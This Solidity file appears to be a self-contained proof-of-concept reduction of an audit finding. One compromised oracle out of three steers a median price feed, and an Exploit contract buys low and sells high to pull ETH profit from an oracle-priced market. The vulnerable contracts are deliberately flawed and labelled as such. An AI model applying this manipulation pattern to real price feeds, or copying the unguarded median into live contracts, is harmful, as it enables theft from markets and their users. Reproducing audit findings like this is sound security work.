// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    API3 — Compromise of a single oracle enables limited control of the dAPI
    value (Simone Monica, Trail of Bits API3 assessment, finding #17624).

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. Three oracle
    feeds report an asset price to a dAPI server. One feed (O2) is compromised
    and can be moved from the normal value of 600 to either endpoint supplied
    by honest feeds (598 or 603). The dAPI median therefore moves to the
    attacker's chosen endpoint. A tiny market prices a token from that median;
    the attacker buys at 598 and sells at 603, realizing the oracle-induced
    spread as native ETH profit.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: a three-source median tolerates a bad value only in the
    narrow sense that it stays between the two honest values. It does not
    prevent one compromised source from choosing any point in that interval,
    and the market consumes the median without a quorum, deviation bound, or
    circuit breaker. In this reduction the public `setValue` models the
    compromised oracle's authenticated update path; the attacker owns O2's
    signing key, not the DapiServer administrator key.
//////////////////////////////////////////////////////////////*/

/// @notice Minimal dAPI server with three independent oracle observations.
contract DapiServer {
    uint256[3] public values;

    constructor() {
        values[0] = 603e18; // honest O0
        values[1] = 598e18; // honest O1
        values[2] = 600e18; // O2 before its key is compromised
    }

    /// @notice Models a signed update accepted for one oracle source.
    /// In the scenario the caller has compromised O2's key and may choose
    /// any value; production authentication is outside this reduction.
    function setValue(uint8 index, uint256 value) external {
        require(index < 3, "oracle index");
        values[index] = value; // @> VULN: one compromised oracle can steer the dAPI median
        // FIX: require quorum/independent validation and reject outliers or stale feeds.
    }

    /// @notice The dAPI is the middle value of its three submissions.
    function readData() public view returns (uint256) {
        uint256 a = values[0];
        uint256 b = values[1];
        uint256 c = values[2];
        if (a > b) (a, b) = (b, a);
        if (b > c) (b, c) = (c, b);
        if (a > b) (a, b) = (b, a);
        return b; // @> VULN: median has no partial-compromise resistance
    }
}

/// @dev Minimal ERC20 used as the market's traded asset.
contract AssetToken {
    string public constant name = "API3 Synthetic Asset";
    string public constant symbol = "sASSET";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Tiny oracle-priced market. Price is 18-decimal units of ETH per
/// token; it is deliberately sufficient only to make the dAPI dependence
/// and resulting spread observable.
contract OracleMarket {
    uint256 public constant SCALE = 1e18;
    DapiServer public immutable oracle;
    AssetToken public immutable token;

    constructor(address oracle_, address token_) {
        oracle = DapiServer(oracle_);
        token = AssetToken(token_);
    }

    receive() external payable {}

    function seed() external payable {}

    function buy() external payable {
        require(msg.value > 0, "zero buy");
        uint256 price = oracle.readData();
        uint256 amount = (msg.value * SCALE) / price;
        require(token.transfer(msg.sender, amount), "inventory");
    }

    function sell(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "transfer");
        uint256 price = oracle.readData();
        uint256 payout = (amount * price) / SCALE;
        require(address(this).balance >= payout, "liquidity");
        (bool ok, ) = payable(msg.sender).call{value: payout}("");
        require(ok, "payout");
    }
}

contract Exploit {
    DapiServer public oracle; // CREATE nonce 1
    AssetToken public token; // CREATE nonce 2
    OracleMarket public market; // CREATE nonce 3

    constructor() {
        oracle = new DapiServer();
        token = new AssetToken();
        market = new OracleMarket(address(oracle), address(token));
        // Give the market ample inventory. The token's open mint is only a
        // reduction convenience; the oracle spread is the finding's issue.
        token.mint(address(market), 1_000_000 ether);
    }

    receive() external payable {}

    /// @notice Compromise O2, buy at the low endpoint, restore O2 to the high
    /// endpoint, and sell at the high endpoint. One 2-ETH call supplies 1 ETH
    /// of market liquidity and 1 ETH of working capital; the spread remains
    /// with this contract as measurable native-ETH profit.
    function run() external payable {
        require(msg.value >= 2 ether, "need 2 ether");

        uint256 baseline = oracle.readData();
        require(baseline == 600e18, "unexpected baseline median");

        // Seed enough ETH for the profitable sell; this is protocol liquidity,
        // not attacker profit.
        market.seed{value: 1 ether}();

        // O2 is the compromised oracle. With honest values 603 and 598, the
        // median can be pushed to the low endpoint 598.
        oracle.setValue(2, 598e18);
        uint256 low = oracle.readData();
        require(low == 598e18, "single oracle did not steer low median");

        market.buy{value: 1 ether}();
        uint256 bought = token.balanceOf(address(this));
        require(bought > 0, "no asset bought");
        token.approve(address(market), bought);

        // The same compromised source can now choose the high endpoint 603.
        oracle.setValue(2, 603e18);
        uint256 high = oracle.readData();
        require(high == 603e18, "single oracle did not steer high median");

        uint256 beforeSell = address(this).balance;
        market.sell(bought);
        uint256 afterSell = address(this).balance;

        // Harm: one source controls the market's executable price inside the
        // honest range, so the buy-then-sell round trip returns more ETH than
        // the 1 ETH working capital. The minimum is 603/598 - 1 > 0.
        require(afterSell > beforeSell, "oracle spread did not profit");
        require(afterSell - beforeSell > 8e15, "spread too small");
    }
}
